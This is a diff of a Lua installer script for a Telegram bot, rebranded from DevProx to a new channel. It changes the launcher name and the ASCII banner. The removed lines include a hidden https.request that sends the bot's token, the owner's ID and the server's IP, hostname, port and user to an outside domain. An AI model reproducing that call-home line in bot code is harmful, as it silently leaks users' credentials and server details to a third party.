@@ -72,8 +72,7 @@ DevProx = DevAbs:get(ServerDevProx.."TokenDevProx"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerDevProx.."IdDevProx")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevAbs:get(ServerDevProx.."IdDevProx").."&TokenBot="..DevAbs:get(ServerDevProx.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
-file = io.open("DevProx.sh", "w")  
+file = io.open("Offices.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/DevProx
@@ -103,7 +102,7 @@ cd $HOME/DevProx
 while(true) do
 rm -fr ../.telegram-cli
 screen -S DevProx -X kill
-screen -S DevProx ./DevProx.sh
+screen -S DevProx ./Offices.sh
 done
 ]]) 
 file:close() 
@@ -124,18 +123,16 @@ local config = loadfile("./config.lua")()
 return config 
 end  
 Load_DevProx() 
-print("\27[36m"..[[                                           
----------------------------------------------
-|    ____             ____                  |
-|   |  _ \  _____   _|  _ \ _ __ _____  __  |
-|   | | | |/ _ \ \ / / |_) | '__/ _ \ \/ /  |
-|   | |_| |  __/\ V /|  __/| | | (_) >  <   |
-|   |____/ \___| \_/ |_|   |_|  \___/_/\_\  |
-|-------------------------------------------|
-|This Source Was Developed By (ABS) @IQ_ABS.|
-|  This Is The Source Channel @Dev_Prox .   |
-|               - DevProx -                 |
----------------------------------------------
+print("\27[36m"..[[
+_       _               _   _ 
+(_   _)     (  _ \            ( ) ( )
+  | |    _  | (_) )  _ _   _| |/ / 
+  | |  / _ \|  _ ( / _  )/ _)   (  
+  | | ( (_) ) (_) ) (_| | (_| |\ \ 
+  (_)  \___/(____/ \__ _)\____)_) (_)
+  
+ - Channel : @TOOBK
+ - DEVELOPER : @JJEJJ
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
